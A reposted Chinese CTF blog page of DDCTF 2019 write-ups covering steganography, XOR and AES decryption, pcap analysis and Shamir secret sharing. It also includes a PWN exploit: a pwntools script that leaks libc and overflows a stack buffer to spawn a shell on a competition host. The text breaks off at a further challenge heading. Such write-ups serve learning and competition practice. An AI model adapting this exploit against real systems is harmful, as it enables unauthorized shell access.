@@ -1,0 +1,1440 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta name="baidu-site-verification" content="UqlC4pwKIm">
+  <meta name="baidu-site-verification" content="d3U0dGeqGw">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.cat.net/css?family=Roboto Slab:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Lobster Two:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css">
+
+
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+
+
+
+
+  <meta name="keywords" content="CTF,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Lem0n'Blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="MISC 原创： ChaMd5  ChaMd5安全团队 转载到自己博客学习">
+<meta name="keywords" content="CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记录一些ctf杂项思路">
+<meta property="og:url" content="https://alem0n.github.io/2019/04/08/记录一些ctf杂项-2019/index.html">
+<meta property="og:site_name" content="Lem0n&#39;Blog">
+<meta property="og:description" content="MISC 原创： ChaMd5  ChaMd5安全团队 转载到自己博客学习">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://alem0n.github.io/images/2019-04-09-记录一些ctf杂项2-2019/640-1555749493789.webp">
+<meta property="og:image" content="https://alem0n.github.io/images/2019-04-09-记录一些ctf杂项2-2019/640-1555749658529.webp">
+<meta property="og:image" content="https://alem0n.github.io/images/2019-04-09-记录一些ctf杂项2-2019/640-1555749666100.webp">
+<meta property="og:image" content="https://alem0n.github.io/images/2019-04-09-记录一些ctf杂项2-2019/640-1555749685750.webp">
+<meta property="og:image" content="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==">
+<meta property="og:updated_time" content="2019-05-21T03:34:42.238Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="记录一些ctf杂项思路">
+<meta name="twitter:description" content="MISC 原创： ChaMd5  ChaMd5安全团队 转载到自己博客学习">
+<meta name="twitter:image" content="https://alem0n.github.io/images/2019-04-09-记录一些ctf杂项2-2019/640-1555749493789.webp">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":true},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: 'undefined',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://alem0n.github.io/2019/04/08/记录一些ctf杂项-2019/">
+
+
+
+
+
+  <title>记录一些ctf杂项思路 | Lem0n'Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Lem0n'Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">一只热爱技术的文艺青年</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://alem0n.github.io/2019/04/08/记录一些ctf杂项-2019/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="lem0n">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="https://wx3.sinaimg.cn/small/d3ea225bly1g287w8pdezj205c05cdg1.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lem0n'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">记录一些ctf杂项思路</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-08T21:00:00+08:00">
+                2019-04-08
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2019-05-21T11:34:42+08:00">
+                2019-05-21
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  3,157
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  16
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+     
+
+      
+      
+
+      
+        <script src="\assets\js\APlayer.min.js"> </script><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><blockquote>
+<p>原创： ChaMd5  ChaMd5安全团队</p>
+<p>转载到自己博客学习</p>
+</blockquote>
+<a id="more"></a>
+<h4 id="真-签到题"><a href="#真-签到题" class="headerlink" title="真-签到题"></a>真-签到题</h4><p>看公告：<br>`DDCTF{return DDCTF::get(2019)-&gt;flagOf(0);}<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### 北京地铁</span><br><span class="line"></span><br><span class="line">stegsolve查看图片，在RBG的lsb中通道最低位看到了隐藏的base64</span><br><span class="line"></span><br><span class="line">![img](/images/2019-04-09-记录一些ctf杂项2-2019/640.webp)</span><br><span class="line"></span><br><span class="line">解密后是16bytes不可见字符，官方提示AES的ecb模式加密，很显然这个是密文，hint3提示我们关键信息在图上，看到可疑位置(有点ps人工涂鸦痕迹)：</span><br><span class="line"></span><br><span class="line">![img](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)</span><br><span class="line"></span><br><span class="line">密钥weigongcun，不足位补\x00，即得flag:</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">k=&quot;iKk/Ju3vu4wOnssdIaUSrg==&quot;</span><br><span class="line">k=k.decode(&quot;base64&quot;)</span><br><span class="line">kirin=AES.new(&quot;weigongcun\x00\x00\x00\x00\x00\x00&quot;,AES.MODE_ECB)</span><br><span class="line">print kirin.decrypt(k)</span><br><span class="line">#DDCTF&#123;CD*Q23&amp;0&#125;</span><br></pre></td></tr></table></figure></p>
+<h4 id="MulTzor"><a href="#MulTzor" class="headerlink" title="MulTzor"></a>MulTzor</h4><p>看题目名称猜测multiple+xor，直接脚本爆破xor，爆破了几位心态崩了(位数太少，而且太慢)，没跑出来，用xortool工具尝试：</p>
+<p><img src="/images/2019-04-09-记录一些ctf杂项2-2019/640-1555749493789.webp" alt="img"></p>
+<p>(最高频率字符是我做的时候从a-z最后空格试过来的)，这个密钥其实有一位错误，不过直接用flag格式DDCTF修正即可，解密：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 *-*</span></span><br><span class="line">key=<span class="string">"38708d2a29ff535d9e3f20f85b40df3c3fab465b9a731ce55b54923279e85b4397362be25c54df2020f8465692733ce5535193363dab465b9a732eee41479a2137ab735f933a3cf8125a91730ee4405f9b730eea4013b61a79ff5d138d3638ef12408a312aff535d8b3a38e71252923c2ce54640df3c3fab7f5c8d203ca6515c9b363dab40529b3a36ab515c923e2ce55b509e2730e45c40df3c3fab465b9a7318f35b40df2336fc57418c732de35347df3b38ef12519a3637ab575d9c3a29e357419a3779fe415a913479ce5c5a983e38ab5f529c3b30e55740d1730de35b40df2a30ee5e579a3779e65b5f962738f94b13963d2dee5e5f96343ce55156df2431e2515bd37338e75d5d98732ee2465bdf2731ea4613992136e6125c8b3b3cf912579a302bf242479a3779ca4a5a8c732bea565a907338e556138b3635ee4241963d2dee40138b2138e5415e96202ae25d5d8c7f79fc5340df3430fd575ddf2731ee125090373ce5535e9a730ce746419e7d79df5a5a8c732eea41139c3c37f85b579a213cef125186732eee41479a2137ab61468f213ce65713be3f35e25757df1036e65f5291373cf91277883a3ee34613bb7d79ce5b409a3d31e445568d732de4125b9e253cab50569a3d79a956569c3a2ae24456dd732de41247973679ca5e5f96363dab445a9c2736f94b1df5590de35713ba3d30ec5f52df3e38e85a5a91362aab45568d3679ea12559e3e30e74b13903579fb5d418b323be757139c3a29e35741df3e38e85a5a91362aab455a8b3b79f95d47902179f851419e3e3be757418c7d79cc5d5c9b7336fb57419e2730e555138f2136e857578a213cf81e138f2136fb5741932a79ee5c5590213aee561fdf2436fe5e57df3b38fd571392323dee1247973679fb5e46983136ea4057df1637e2555e9e7334ea515b963d3cab475d9d213cea59529d3f3ca5127b90243cfd5741d37334e44147df3c3fab465b9a731eee405e9e3d79e65b5f962738f94b13993c2be85740d3732aee51419a2779f85741893a3aee41139e3d3dab515a893a35e2535ddf323eee5c5096362aab465b9e2779fe41569b731ce55b54923279ee5f43933c20ee56138f3c36f9125c8f362bea465a913479fb405c9c363dfe40568c7f79ea5c57df3a2dab45528c732de357409a7329e45d41df232be451569b262bee41138b3b38ff1252933f36fc5757df2731ee1276913a3ee6531392323ae35b5d9a2079ff5d139d3679f957459a212aee1f56913430e557568d363dab535d9b732de357139c3a29e357418c732de412519a732bee5357d15953df5a56df143cf95f52917329e747549d3c38f9561e9a222ce242439a3779ce5c5a983e38ab50569c3234ee127d9e2930ab75568d3e38e54b148c7329f95b5d9c3a29ea5e139c2120fb465cd22020f84656927d79c2461388322aab504190383ce5125186732de35713af3c35e2415bdf143ce557419e3f79d8465299357ef81270962331ee4013bd262bee5346df3a37ab76569c3634e95741df6260b8001fdf2430ff5a138b3b3cab535a9b7336ed12758d3637e85a1e8c2629fb5e5a9a3779e25c479a3f35e2555691303cab5f528b362be2535fdf3c3bff535a91363dab5441903e79ea12749a2134ea5c138c2320a51272df3e36e5465bdf313ced5d419a732de3571390262de940569e3879e45413a83c2be75613a8322bab7b7ad37338ff1252df3036e554568d3637e85713973635ef125d9a322bab65528d2038fc1e138b3b3cab625c933a2ae31270962331ee4013bd262bee5346df2031ea40569b7330ff4113ba3d30ec5f52d2312bee5358963d3eab46569c3b37e243469a2079ea5c57df273ce85a5d903f36ec4b13883a2de31247973679cd4056913031ab535d9b731bf95b47962031a512778a2130e555138b3b3cab75568d3e38e5125a912538f85b5c917336ed1263903f38e5561fdf3036f95713af3c35e2415bdf1030fb5a568d731bfe40569e2679fb57418c3c37e5575fdf243cf957139a2538e847528b363da71245963279d95d5e9e3d30ea1e138b3c79cd405291303cab455b9a213cab465b9a2a79ee41479e3135e2415b9a3779ff5a56df031aab70418a3d36ab415a983d38e74113963d2dee5e5f96343ce55156df202dea465a903d79fc5b4797731ff9575d9c3b79ed5350963f30ff5b568c732afe424390212da512608a303aee4140992635ab515c90233cf95347963c37ab535e903d3eab465b9a7309e45e568c7f79ff5a56df152bee5c50977f79ea5c57df2731ee12718d3a2de2415bdf322dab705f9a273ae35e56867309ea4058df3036e5465a91263cef1246912730e712798a3d3cab030acb6375ab455b9a3d79cd405291303cab41468d213ce556568d363dab465cdf2731ee12749a2134ea5c40d15953cd405c92732de35b40df313cec5b5d913a37ec1e138b3b3cab7041962730f85a13b83c2fee405d923637ff127090373cab535d9b731af2425b9a2179d8515b903c35ab1a74bc751ad81b139e2779c95e568b3031e7574adf0338f959139d2630e746138a2379ea5c139a2b2dee5c4096253cab514186232dea5c52932a2de251139c3229ea505a933a2df21c13b63d30ff5b52933f20a71247973679ef57508d2a29ff5b5c91732eea4113923230e55e4adf3c3fab7e4699272eea54559a7371cc5741923237ab535a8d733fe440509a7a79ea5c57df3279ed5744df1b3cee4013d7143cf95f52917338f95f4ad67334ee41409e343cf81e139e2079ff5a56df182be257548c3e38f95b5d9a7371cc5741923237ab5c52892a70ab575e8f3f36f25757df3e2ce85a13923c2bee12409a302cf957138f2136e857578a213cf81255902179fe415a913479ce5c5a983e38a51272933237ab66468d3a37ec1e139e731aea5f518d3a3dec5713aa3d30fd57418c3a2df2125e9e2731ee5f528b3a3ae2535ddf3237ef125f903430e85b52917f79fb405c893a3dee561392263ae3125c99732de35713902130ec5b5d9e3f79ff5a5a913830e555138b3b38ff125f9a3779ff5d138b3b3cab56568c3a3ee5125c99732de357139c2120fb4652913235f2465a9c3235ab505c92313cab5f529c3b30e55740df2731ea461388362bee125a91202df9475e9a3d2dea5e13963d79ee445691272cea5e5f86733bf95752943a37ec1247973679e553459e3f79ce5c5a983e38a5127b90243cfd5741d3732de35713b42130ee554092322be25c56df3a37ff405c9b263aee56139e3d79ce5c5a983e38ab44568d2030e45c13883a2de31252df3536fe404797732be4465c8d733fe4401396272aab671e9d3c38ff411fdf213cf8475f8b3a37ec125a917338ab4241903f36e555569b7329ee405a903779fc5a5691732de357409a7334ee41409e343cf81250902635ef125d902779e957139b363af94b438b363da51264962731ab465b9a733aea42478a213cab5d55df213ce757459e3d2dab515a8f3b3cf912589a2a2aab535d9b732de357138a203cab5d55df3e2ce85a1399322aff5741df060aab7c52892a79e95d5e9d362aa712419a342ce75341d3732bea425a9b732bee5357963d3eab5d55df0674e95d528b7334ee41409e343cf812419a202ce65757d15953df5a56df3535ea5513962063ab7677bc071ff002579c3638b806069d326dbd040bcf3169e90101cc3761ea0a02cf656db8570a82"</span></span><br><span class="line">key=key.decode(<span class="string">"hex"</span>)</span><br><span class="line">ans=<span class="string">""</span></span><br><span class="line">k=<span class="string">"23\xffSY\x8b"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(key)):</span><br><span class="line">  ans+=chr(ord(key[i])^ord(k[i%len(k)]))</span><br><span class="line"><span class="keyword">print</span> ans</span><br><span class="line"><span class="comment">#the last line of input：</span></span><br><span class="line"><span class="comment">#The flag is: DDCTF&#123;0dcea345ba46680b0b323d8a810643e9&#125;</span></span><br></pre></td></tr></table></figure>
+<h4 id="PWN-strike"><a href="#PWN-strike" class="headerlink" title="[PWN] strike"></a>[PWN] strike</h4><p>首先其读入name时不存在00截断，而且保存在栈内，所以很容易想到利用栈内原有数据leak：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">printf(<span class="string">"Enter username: "</span>);</span><br><span class="line">  v2 = fileno(stream);</span><br><span class="line">  read(v2, &amp;buf, <span class="number">0x40</span>u);</span><br><span class="line">  <span class="keyword">return</span> fprintf(a2, <span class="string">"Hello %s"</span>, &amp;buf);</span><br></pre></td></tr></table></figure>
+<p>第二点，在判断长度时使用了符号数，但是读取时是无符号数，直接输入负数即可导致后面栈溢出（程序没有canary保护）：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nbytes = sub_804862D();</span><br><span class="line">  <span class="keyword">if</span> ( (signed int)nbytes &gt; <span class="number">63</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(<span class="string">"Too long!"</span>);</span><br><span class="line">    exit(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  printf(<span class="string">"Enter password(lenth %u): "</span>, nbytes);</span><br><span class="line">  v1 = fileno(stdin);</span><br><span class="line">  read(v1, &amp;buf, nbytes);</span><br></pre></td></tr></table></figure>
+<p>不过直接覆盖为one_gadget发现会crash，gdb追踪发现其的返回方式是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lea     esp, [ecx-4]</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>
+<p>我们需要覆盖栈中保存ecx的位置为我们输入的one_gadget位置<br>很容易想到盲打，覆盖保存ecx的位置最低位为\x00，这样原本ret的地方就会上移，但是因为只覆盖了最低位，所以会很大概率落到我们的前面的输入里，只要在栈里布置一片one_gadget,即可get shell：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level="debug"</span></span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">"116.85.48.105"</span>,<span class="number">5005</span>)</span><br><span class="line">p.sendafter(<span class="string">"username: "</span>,<span class="string">"aaaa"</span>*<span class="number">6</span>)</span><br><span class="line">p.recvuntil(<span class="string">"aaaa"</span>*<span class="number">6</span>)</span><br><span class="line">leak=u32(p.recv(<span class="number">4</span>))<span class="number">-0x5f6bb</span></span><br><span class="line">payload=p32(leak+<span class="number">0x5f065</span>)*<span class="number">17</span>+<span class="string">"\x00"</span></span><br><span class="line">p.sendlineafter(<span class="string">"password: "</span>,<span class="string">"-1"</span>)</span><br><span class="line">p.sendafter(<span class="string">": "</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h4 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h4><p>首先看http流，发现主要是访问了一个图库和脚本网站：</p>
+<p><img src="/images/2019-04-09-记录一些ctf杂项2-2019/640-1555749658529.webp" alt="img"></p>
+<p>提取出其中的几张图片，主要是其中一张name为intersting的和一张钥匙，将钥匙图片修改文件头的图片高度看到下面有东西：</p>
+<p><img src="/images/2019-04-09-记录一些ctf杂项2-2019/640-1555749666100.webp" alt="img"></p>
+<p>前往http包url的地址：<br><code>http://tools.jb51.net/aideddesign/img_add_info</code><br>解密其他的png，其中有一张可以解密出字符串：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag+AHs-44444354467B786F6644646B65537537717335414443515256476D35464536617868455334377D+AH0-</span><br></pre></td></tr></table></figure>
+<p>中间hex解密即得flag：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">"44444354467B786F6644646B65537537717335414443515256476D35464536617868455334377D"</span>.decode(<span class="string">"hex"</span>)</span><br><span class="line"><span class="string">'DDCTF&#123;xofDdkeSu7qs5ADCQRVGm5FE6axhES47&#125;'</span></span><br></pre></td></tr></table></figure>
+<h4 id="联盟决策大会"><a href="#联盟决策大会" class="headerlink" title="联盟决策大会"></a>联盟决策大会</h4><p>题目很清楚是Shamir秘密分享方案，因为：当三位以上【组织1】成员和三位以上【组织2】成员同意时，才可以制定或修改协议，组1的1、2、4，组2的3、4、5分别进行解密，而后再将解密数据按照组1,2进行解密即可，这里注意计算拉格朗日差值多项式取模的时候相当于乘以分母对p的乘法逆元：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> invmod</span><br><span class="line"></span><br><span class="line">p=<span class="number">0x85FE375B8CDB346428F81C838FCC2D1A1BCDC7A0A08151471B203CDDF015C6952919B1DE33F21FB80018F5EA968BA023741AAA50BE53056DE7303EF702216EE9</span></span><br><span class="line">key1 =<span class="number">0x60E455AAEE0E836E518364442BFEAB8E5F4E77D16271A7A7B73E3A280C5E8FD142D3E5DAEF5D21B5E3CBAA6A5AB22191AD7C6A890D9393DBAD8230D0DC496964</span></span><br><span class="line">key2 =<span class="number">0x6D8B52879E757D5CEB8CBDAD3A0903EEAC2BB89996E89792ADCF744CF2C42BD3B4C74876F32CF089E49CDBF327FA6B1E36336CBCADD5BE2B8437F135BE586BB1</span></span><br><span class="line">key3 =<span class="number">0x74C0EEBCA338E89874B0D270C143523D0420D9091EDB96D1904087BA159464BF367B3C9F248C5CACC0DECC504F14807041997D86B0386468EC504A158BE39D7</span></span><br><span class="line">key4=<span class="number">0x560607563293A98D6D6CCB219AC74B99931D06F7DEBBFDC2AFCC360A12A97D9CA950475036497F44F41DC5492977F9B4A0E4C8E0368C7606B7B82C34F561525</span></span><br><span class="line">key5=<span class="number">0x445CCE871E61AD5FDE78ECE87C42219D5C9F372E5BEC90C4C4990D2F37755A4082C7B52214F897E4EC1B5FB4A296DBE5718A47253CC6E8EAF4584625D102CC62</span></span><br><span class="line">key6 =<span class="number">0x4F148B40332ACCCDC689C2A742349AEBBF01011BA322D07AD0397CE0685700510A34BDC062B26A96778FA1D0D4AFAF9B0507CC7652B0001A2275747D518EDDF5</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span><span class="params">(x,y,a)</span>:</span></span><br><span class="line">    ans=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(y)):</span><br><span class="line">        tmp1=<span class="number">1</span></span><br><span class="line">        tmp2=<span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(y)):</span><br><span class="line">            <span class="keyword">if</span> i !=j:</span><br><span class="line">                tmp1*=(a-x[j])</span><br><span class="line">                tmp2*=(x[i]-x[j])</span><br><span class="line">        ans +=(tmp1*y[i]*invmod(tmp2,p))%p</span><br><span class="line">    <span class="keyword">return</span> ans%p</span><br><span class="line">x=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>]</span><br><span class="line">y=[key1,key2,key3]</span><br><span class="line">k1=calc(x,y,<span class="number">0</span>)%p</span><br><span class="line">x=[<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">y=[key4,key5,key6]</span><br><span class="line">k2=calc(x,y,<span class="number">0</span>)%p</span><br><span class="line">x=[<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line">y=[k1,k2]</span><br><span class="line"><span class="keyword">print</span> hex(calc(x,y,<span class="number">0</span>)%p)[<span class="number">2</span>:<span class="number">-1</span>].decode(<span class="string">"hex"</span>)</span><br><span class="line"><span class="comment">#output：DDCTF&#123;nYrpbcscdNgqX63IdtnkLrq9FQvwfa2f&#125;</span></span><br></pre></td></tr></table></figure>
+<h4 id="伪-声纹锁"><a href="#伪-声纹锁" class="headerlink" title="伪-声纹锁"></a>伪-声纹锁</h4><p>首先题目脚本：</p>
